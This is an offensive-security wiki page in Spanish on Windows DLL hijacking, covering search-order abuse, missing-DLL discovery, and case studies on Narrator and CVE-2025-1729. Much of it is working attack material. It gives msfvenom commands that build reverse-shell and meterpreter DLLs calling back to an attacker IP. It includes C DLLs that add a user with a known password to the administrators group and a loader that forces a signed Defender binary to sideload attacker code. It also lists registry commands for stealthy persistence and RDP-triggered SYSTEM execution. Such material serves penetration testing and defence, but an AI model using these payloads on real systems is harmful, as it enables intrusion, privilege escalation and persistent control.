# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Información básica

DLL Hijacking consiste en manipular una aplicación confiable para que cargue una DLL maliciosa. Este término abarca varias tácticas como **DLL Spoofing, Injection, and Side-Loading**. Se utiliza principalmente para ejecución de código, lograr persistence y, con menos frecuencia, privilege escalation. A pesar de que aquí se centra en la escalada, el método de hijacking es el mismo para los distintos objetivos.

### Técnicas comunes

Se emplean varios métodos para DLL hijacking, y su efectividad depende de la estrategia de carga de DLLs de la aplicación:

1. **DLL Replacement**: Reemplazar una DLL legítima por una maliciosa, opcionalmente usando DLL Proxying para preservar la funcionalidad original de la DLL.
2. **DLL Search Order Hijacking**: Colocar la DLL maliciosa en una ruta de búsqueda que tenga prioridad sobre la legítima, explotando el patrón de búsqueda de la aplicación.
3. **Phantom DLL Hijacking**: Crear una DLL maliciosa que la aplicación intentará cargar creyendo que es una DLL requerida inexistente.
4. **DLL Redirection**: Modificar parámetros de búsqueda como %PATH% o archivos .exe.manifest / .exe.local para dirigir a la aplicación hacia la DLL maliciosa.
5. **WinSxS DLL Replacement**: Sustituir la DLL legítima por una maliciosa en el directorio WinSxS, un método frecuentemente relacionado con DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar la DLL maliciosa en un directorio controlado por el usuario junto con la aplicación copiada, asemejándose a técnicas de Binary Proxy Execution.

## Encontrar Dlls faltantes

La forma más común de encontrar Dlls faltantes dentro de un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **siguientes 2 filtros**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

y mostrar solo la **File System Activity**:

![](<../../../images/image (153).png>)

Si buscas **missing dlls en general** deja esto ejecutándose durante unos **segundos**.\
Si buscas una **missing dll dentro de un ejecutable específico** deberías añadir **otro filtro como "Process Name" "contains" `<exec name>`, ejecutarlo y detener la captura de eventos**.

## Explotando Dlls faltantes

Para escalar privilegios, la mejor oportunidad es poder **escribir una dll que un proceso con privilegios intentará cargar** en alguno de los **lugares donde se la buscará**. Por lo tanto, podremos **escribir** una dll en una **carpeta** donde la **dll se busca antes** que en la carpeta donde está la **dll original** (caso extraño), o podremos **escribir en una carpeta donde la dll va a ser buscada** y la dll original no existe en ninguna carpeta.

### Dll Search Order

**Dentro de la** [**documentación de Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puedes encontrar cómo se cargan las Dlls específicamente.**

Las **aplicaciones Windows** buscan DLLs siguiendo un conjunto de rutas de búsqueda predefinidas, respetando un orden particular. El problema del DLL hijacking surge cuando una DLL maliciosa se coloca estratégicamente en uno de estos directorios, asegurando que se cargue antes que la DLL auténtica. Una solución para evitar esto es asegurar que la aplicación use rutas absolutas al referirse a las DLLs que necesita.

Puedes ver el **orden de búsqueda de DLL en sistemas de 32 bits** a continuación:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ese es el orden de búsqueda **por defecto** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual sube a la segunda posición. Para desactivar esta característica, crea el valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y establécelo en 0 (por defecto está habilitado).

Si la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) es llamada con **LOAD_WITH_ALTERED_SEARCH_PATH**, la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.

Finalmente, ten en cuenta que **una dll podría ser cargada indicando la ruta absoluta en lugar del solo nombre**. En ese caso esa dll **solo será buscada en esa ruta** (si la dll tiene dependencias, estas serán buscadas como si la dll acabara de ser cargada por nombre).

Existen otras formas de alterar el orden de búsqueda pero no las voy a explicar aquí.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Una forma avanzada de influir determinísticamente en la ruta de búsqueda de DLL de un proceso recién creado es establecer el campo DllPath en RTL_USER_PROCESS_PARAMETERS al crear el proceso con las APIs nativas de ntdll. Al suministrar un directorio controlado por el atacante aquí, un proceso objetivo que resuelva una DLL importada por nombre (sin ruta absoluta y sin usar los flags de carga seguros) puede ser forzado a cargar una DLL maliciosa desde ese directorio.

Idea clave
- Construir los parámetros del proceso con RtlCreateProcessParametersEx y proporcionar un DllPath personalizado que apunte a tu carpeta controlada (por ejemplo, el directorio donde vive tu dropper/unpacker).
- Crear el proceso con RtlCreateUserProcess. Cuando el binario objetivo resuelva una DLL por nombre, el loader consultará este DllPath suministrado durante la resolución, permitiendo un sideloading fiable incluso cuando la DLL maliciosa no está colocada junto al EXE objetivo.

Notas/limitaciones
- Esto afecta al proceso hijo que se está creando; es diferente a SetDllDirectory, que afecta solo al proceso actual.
- El objetivo debe importar o LoadLibrary una DLL por nombre (sin ruta absoluta y sin usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs y rutas absolutas codificadas no pueden ser hijackeadas. Exportaciones reenviadas y SxS pueden cambiar la precedencia.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Ejemplo de uso operativo
- Coloca un xmllite.dll malicioso (exportando las funciones requeridas o haciendo proxy al real) en tu directorio DllPath.
- Ejecuta un binario firmado que se sabe que busca xmllite.dll por nombre usando la técnica anterior. El loader resuelve la importación vía el DllPath suministrado y sideloads tu DLL.

Se ha observado esta técnica en el mundo real para impulsar cadenas de sideloading multietapa: un lanzador inicial deja caer un DLL auxiliar, que luego ejecuta un binario Microsoft-signed, hijackable con un DllPath personalizado para forzar la carga del DLL del atacante desde un staging directory.


#### Excepciones en el orden de búsqueda de dll según la documentación de Windows

Ciertas excepciones al orden estándar de búsqueda de DLL se indican en la documentación de Windows:

- Cuando se encuentra una **DLL que comparte su nombre con una ya cargada en memoria**, el sistema omite la búsqueda habitual. En su lugar, realiza una comprobación de redirección y de manifest antes de recurrir a la DLL ya en memoria. **En este escenario, el sistema no realiza una búsqueda de la DLL**.
- En los casos en que la DLL es reconocida como una **known DLL** para la versión actual de Windows, el sistema utilizará su versión de la known DLL, junto con cualquiera de sus DLL dependientes, **omitiendo el proceso de búsqueda**. La clave del registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estas known DLLs.
- Si una **DLL tiene dependencias**, la búsqueda de estas DLL dependientes se realiza como si se hubieran indicado únicamente por sus **module names**, independientemente de si la DLL inicial fue identificada mediante una ruta completa.

### Escalada de privilegios

**Requisitos**:

- Identificar un proceso que opere o vaya a operar bajo **privilegios distintos** (movimiento horizontal o lateral), que **carezca de una DLL**.
- Asegurarse de que haya **acceso de escritura** disponible para cualquier **directorio** en el que se **busque** la **DLL**. Esta ubicación podría ser el directorio del ejecutable o un directorio dentro de la ruta del sistema.

Sí, los requisitos son complicados de encontrar, ya que **por defecto es bastante raro encontrar un ejecutable privilegiado al que le falte una dll** y es aún **más raro tener permisos de escritura en una carpeta de la ruta del sistema** (por defecto no puedes). Pero, en entornos mal configurados esto es posible.\
En caso de que tengas suerte y cumplas los requisitos, puedes revisar el proyecto [UACME](https://github.com/hfiref0x/UACME). Incluso si el **main goal of the project is bypass UAC**, puedes encontrar allí un **PoC** de un Dll hijaking para la versión de Windows que puedes usar (probablemente solo cambiando la ruta de la carpeta donde tienes permisos de escritura).

Ten en cuenta que puedes **comprobar tus permisos en una carpeta** haciendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **comprueba los permisos de todas las carpetas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes comprobar los imports de un ejecutable y los exports de una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para una guía completa sobre cómo **abuse Dll Hijacking to escalate privileges** con permisos para escribir en una **System Path folder** consulta:

{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Herramientas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will comprobará si tienes permisos de escritura en cualquier carpeta dentro del system PATH.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll_.

### Ejemplo

Si encuentras un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear una dll que exporte al menos todas las funciones que el ejecutable importará desde ella**. De todas formas, ten en cuenta que Dll Hijacking resulta útil para [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o desde[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **cómo crear una dll válida** dentro de este estudio sobre dll hijacking enfocado en dll hijacking para ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **próxima sección** puedes encontrar algunos **códigos dll básicos** que podrían ser útiles como **plantillas** o para crear una **dll con funciones no requeridas exportadas**.

## **Creación y compilación de Dlls**

### **Dll Proxifying**

Básicamente un **Dll proxy** es una Dll capaz de **ejecutar tu código malicioso cuando se carga** pero también de **exponer** y **funcionar** como **se espera** al **reenviar todas las llamadas a la biblioteca real**.

Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes en realidad **indicar un ejecutable y seleccionar la librería** que quieres proxify y **generar un proxified dll** o **indicar la Dll** y **generar un proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtener un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (x86; no vi una versión x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tu propio

Ten en cuenta que en varios casos la Dll que compiles debe **export several functions** que serán cargadas por el victim process; si estas funciones no existen, el **binary won't be able to load** them y el **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Ejemplo de DLL en C++ con creación de usuario</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativo con thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudio de caso: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe todavía sondea una DLL de localización predecible y específica por idioma al iniciarse que puede ser hijackeada para ejecución arbitraria de código y persistencia.

Hechos clave
- Ruta de sondeo (compilaciones actuales): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ruta heredada (compilaciones anteriores): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si existe una DLL escribible controlada por el atacante en la ruta OneCore, se carga y `DllMain(DLL_PROCESS_ATTACH)` se ejecuta. No se requieren exports.

Detección con Procmon
- Filtro: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Inicia Narrator y observa el intento de carga de la ruta anterior.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silencio
- Un hijack ingenuo hablará/añadirá foco a la UI. Para mantenerse silencioso, al attach enumerar los hilos de Narrator, abrir el hilo principal (`OpenThread(THREAD_SUSPEND_RESUME)`) y `SuspendThread` en él; continuar en tu propio hilo. Ver PoC para el código completo.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con lo anterior, al iniciar Narrator se carga la DLL plantada. En el secure desktop (logon screen), pulsa CTRL+WIN+ENTER para iniciar Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Conéctate por RDP al host; en la pantalla de logon pulsa CTRL+WIN+ENTER para lanzar Narrator; tu DLL se ejecuta como SYSTEM en el secure desktop.
- La ejecución se detiene cuando la sesión RDP se cierra—inject/migrate con rapidez.

Bring Your Own Accessibility (BYOA)
- Puedes clonar una entrada de registro de una Accessibility Tool (AT) integrada (por ejemplo, CursorIndicator), editarla para que apunte a un binario/DLL arbitrario, importarla y luego poner `configuration` a ese nombre de AT. Esto proxea la ejecución arbitraria bajo el framework de Accessibility.

Notas
- Escribir bajo `%windir%\System32` y cambiar valores de HKLM requiere privilegios de admin.
- Toda la lógica del payload puede residir en `DLL_PROCESS_ATTACH`; no se necesitan exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Este caso demuestra **Phantom DLL Hijacking** en el TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), rastreado como **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` localizado en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se ejecuta diariamente a las 9:30 AM bajo el contexto del usuario logueado.
- **Directory Permissions**: Escribible por `CREATOR OWNER`, permitiendo a usuarios locales dejar archivos arbitrarios.
- **DLL Search Behavior**: Intenta cargar `hostfxr.dll` desde su directorio de trabajo primero y registra "NAME NOT FOUND" si falta, indicando precedencia de búsqueda en el directorio local.

### Exploit Implementation

Un atacante puede colocar un `hostfxr.dll` stub malicioso en el mismo directorio, explotando la DLL faltante para lograr ejecución de código en el contexto del usuario:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flujo de ataque

1. Como usuario estándar, coloca `hostfxr.dll` en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Espera a que la tarea programada se ejecute a las 9:30 AM bajo el contexto del usuario actual.
3. Si un administrador ha iniciado sesión cuando la tarea se ejecuta, la DLL maliciosa se ejecuta en la sesión del administrador con integridad media.
4. Encadena técnicas estándar de UAC bypass para elevar de integridad media a privilegios SYSTEM.

## Referencias

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)


{{#include ../../../banners/hacktricks-training.md}}
